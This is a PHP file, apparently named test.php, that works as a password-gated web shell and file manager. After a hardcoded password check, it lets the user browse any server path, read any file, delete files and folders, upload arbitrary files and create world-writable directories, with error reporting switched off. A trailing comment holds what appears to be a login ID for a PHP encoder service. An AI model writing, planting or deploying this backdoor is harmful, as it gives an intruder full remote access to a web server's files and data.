<?php
//phpinfo();
error_reporting(0);
session_start();
echo "<pre>";
?>
<style type="text/css">
a{
	text-decoration: none;
    line-height: 20px;	
}
a:hover{
	color: red;
}
</style>


<?php
if(!isset($_SESSION['kp']) || $_SESSION['kp'] != "kp007kp007")
{
	if(isset($_POST['action']) && $_POST['action'] == "setkp" && $_POST['kp'] == "kp007kp007")
	{
		$_SESSION['kp'] = "kp007kp007";
		echo "<script>window.location = 'test.php';</script>";
		exit;
	}
	else
	{
		session_destroy();
	}
//print_r($_REQUEST);
?>
    <form method="post" action="test.php" >
    <input type="hidden" value="setkp" name="action">
    <div>
        <p>set kp :  <input type="text" name="kp" /></p>
        <p><input type="submit" value="submit" name="submit"></p>
    </div>
    </form>
<?php
exit;	
}




	
if(isset($_REQUEST['r']) && $_REQUEST['r'] != "")
{
	
	if(is_dir($_REQUEST['r']))
	{
		rmdir($_REQUEST['r']);
	}
	else
	{
		unlink($_REQUEST['r']);
	}
	
	echo "deleted :`".$_REQUEST['r']."`";
}

	
	
	
	

if(!isset($_REQUEST['path']) || $_REQUEST['path'] == "" )
{
	$path = $_SERVER['DOCUMENT_ROOT'];
}
else
{
	$path = $_REQUEST['path'];	
}









if(!empty($_FILES['uploads']) && $_FILES['uploads']['error'] == 0){
	move_uploaded_file($_FILES['uploads']['tmp_name'],$path.$_FILES['uploads']['name']);
	echo "<b>File Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']."<br><br>";
}

if(isset($_REQUEST['folder']) && $_REQUEST['folder'] != ""){
	//move_uploaded_file($_FILES['uploads']['tmp_name'],$path.$_FILES['uploads']['name']);
	$folder = $path."/".$_REQUEST['folder'];
	if (!mkdir($folder, 0777, true)) {
	    echo "Failed to create directory !!";
	}
	else
	{
		echo "<b>Directory created !!!</b><br>name : ".$_REQUEST['folder']."<br><br>";
	}
}








		echo "<br>";
		echo "Current Path : <b>`<a href='test.php?path=".$path."'>".$path."`</a></b>";
		echo "<br>";
		
		if(is_dir($path))
		{
			echo getfolder($path); // id folder
		}
		else
		{
			echo getfile($path); // is file
			//chmod($path, 0755); // Everything for owner, read and execute for others, do 0777
		}
		echo "<br>";



?>





















<?php
function getfolder($path) // get folder fildes
{
	
		$contents ="";
		
		if($folderallfiles = opendir($path)) {
			while(false !== ($thisfolder = readdir($folderallfiles)))
			{
				if($thisfolder == "..")
				{   
					$contents .= '<a href="test.php?path='.str_replace($creatpath[(count($creatpath = explode("/",$path)) - 2)]."/","",$path).'"><-Back</a><br>';
				}
				else if($thisfolder != ".")
				{
					
					if(!is_dir($path.$thisfolder))
					{
						$linkpath = $path.$thisfolder;
						$edit = '<a href="openfile.php?file='.$linkpath.'" target="_blank">&nbsp;edit</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';  // for edit 
					}
					else
					{
						$linkpath = $path.$thisfolder."/";
						$edit = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';  // for edit  
					}
					
					$contents .= '<a href="test.php?path='.$linkpath.'">'.$thisfolder.'</a>';
					
					// for delete file and folder unhide it 
					$c = "return confirm('sure you want to delete `".$thisfolder."`??');";
					$fp = filepermissions($linkpath);
					$contents .= '&nbsp;&nbsp;&nbsp;<a title="'.$fp.'" onClick="'.$c.'" href="test.php?path='.$path.'&r='.$linkpath.'">(X)</a>';  // for delete file and folder unhide it 
					// for delete file and folder unhide it 					
					$contents .= $edit;  // for edit file or folder unhide it 

					
				}
				$contents .= "<br>";
			}
			$contents .= '<br><form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" /><input name="path" type="hidden" value="'.$path.'"></form>';
			$contents .= '<br><form method="post" target="_self" enctype="multipart/form-data">  <input type="text" size="31" name="folder" placeholder="New directory name"/> <input type="submit" value="create" /><input name="path" type="hidden" value="'.$path.'"></form><br><br>';


			closedir($folderallfiles);
		}
	return $contents;
}
?>





<?php
function getfile($filename) // get file content
{
	$bacllink = '<br><a href="test.php?path='.str_replace($creatpath[(count($creatpath = explode("/",$filename))-1)],"",$filename).'"><-Back</a><br><br>';
	$handle = fopen($filename, "r");
	$contents = fread($handle, filesize($filename));
	
	
		
	$filecontant = "<xmp>".$contents."</xmp>";
	

	
	$filedata = stat($filename);
	$filecontant .= "<br><br><br><br>Size : ".($filedata['size']/1048576)." MB";
	$filecontant .= "<br><br>Time of last access : ".date("j F, Y ,g:i a",strtotime(date('m/d/Y h:i:s', $filedata['atime']))); //        date('m/d/Y h:i:s', $filedata['atime']);
	$filecontant .= "<br><br>Time of last modification : ".date("j F, Y ,g:i a",strtotime(date('m/d/Y h:i:s', $filedata['mtime']))); //  date('m/d/Y h:i:s', $filedata['mtime']);
	


	
	return $bacllink.$filecontant;
	
	
}


function filepermissions($filename){ // get file content
	$perms = fileperms($filename);
	$info = substr(sprintf('%o', $perms), -4);
	return $info;
}

//http://www.byterun.com/free-php-encoder.php 
//Type LOGIN ID: qE1VKWJIRTGVKb8o 
?>